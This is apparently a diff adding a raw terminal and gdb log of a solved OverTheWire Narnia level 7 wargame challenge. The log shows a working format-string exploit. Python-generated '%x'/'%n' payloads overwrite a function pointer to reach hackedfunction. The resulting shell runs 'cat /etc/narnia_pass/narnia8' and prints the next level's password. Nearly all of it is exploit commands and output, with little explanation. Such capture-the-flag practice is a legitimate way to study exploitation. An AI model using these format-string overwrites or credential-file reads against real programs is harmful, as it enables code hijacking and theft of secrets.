@@ -1,0 +1,64 @@
+narnia7@melinda:/narnia$ ./narnia7 $(python -c "print 'aaaa' + '%x.'*10")
+goodfunction() = 0x804866f
+hackedfunction() = 0x8048695
+
+before : ptrf() = 0x804866f (0xffffd60c)
+
+(gdb) x/20x $esp
+0xffffd5f0:	0xffffd610	0x00000080	0xffffd89c	0xf7fcf2e8
+0xffffd600:	0x00000001	0x00000000	0x00000001	0x0804866f
+0xffffd610:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffd620:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffd630:	0x00000000	0x00000000	0x00000000	0x00000000
+(gdb) x 0xf7fcf2e8
+0xf7fcf2e8:	0x08048310
+(gdb) ni
+0x0804860b in vuln ()
+(gdb) x/20x $esp
+0xffffd5f0:	0xffffd610	0x00000080	0xffffd89c	0xf7fcf2e8
+0xffffd600:	0x00000001	0x00000000	0x00000001	0x0804866f
+0xffffd610:	0x41414141	0x00000000	0x00000000	0x00000000
+0xffffd620:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffd630:	0x00000000	0x00000000	0x00000000	0x00000000
+
+(gdb) r $(python -c 'print "\xfc\xd5\xff\xff" + "%x" * 5 + "%n"')
+Starting program: /games/narnia/narnia7 $(python -c 'print "\xfc\xd5\xff\xff" + "%x" * 5 + "%n"')
+goodfunction() = 0x804866f
+hackedfunction() = 0x8048695
+
+before : ptrf() = 0x804866f (0xffffd5fc)
+I guess you want to come to the hackedfunction...
+
+Breakpoint 1, 0x08048606 in vuln ()
+(gdb) ni
+0x0804860b in vuln ()
+(gdb) x/20x $esp
+0xffffd5e0:	0xffffd600	0x00000080	0xffffd892	0xf7fcf2e8
+0xffffd5f0:	0x00000001	0x00000000	0x00000001	0x00000016
+0xffffd600:	0xffffd5fc	0x63663766	0x38653266	0x38313031
+0xffffd610:	0x36383430	0x00006636	0x00000000	0x00000000
+0xffffd620:	0x00000000	0x00000000	0x00000000	0x00000000
+(gdb) x 0xffffd5fc
+0xffffd5fc:	0x00000016
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00000016 in ?? ()
+narnia7@melinda:/narnia$ /games/narnia/narnia7 $(python -c 'print "\xfc\xd5\xff\xff" + "%x" * 4 + "%.134514310x%n"')
+goodfunction() = 0x804866f
+hackedfunction() = 0x8048695
+
+before : ptrf() = 0x804866f (0xffffd5ec)
+I guess you want to come to the hackedfunction...
+Welcome to the goodfunction, but i said the Hackedfunction..
+narnia7@melinda:/narnia$ /games/narnia/narnia7 $(python -c 'print "\xec\xd5\xff\xff" + "%x" * 4 + "%.134514310x%n"')
+goodfunction() = 0x804866f
+hackedfunction() = 0x8048695
+
+before : ptrf() = 0x804866f (0xffffd5ec)
+I guess you want to come to the hackedfunction...
+Way to go!!!!$ whoami
+narnia8
+$ cat /etc/narnia_pass/narnia8
+mohthuphog
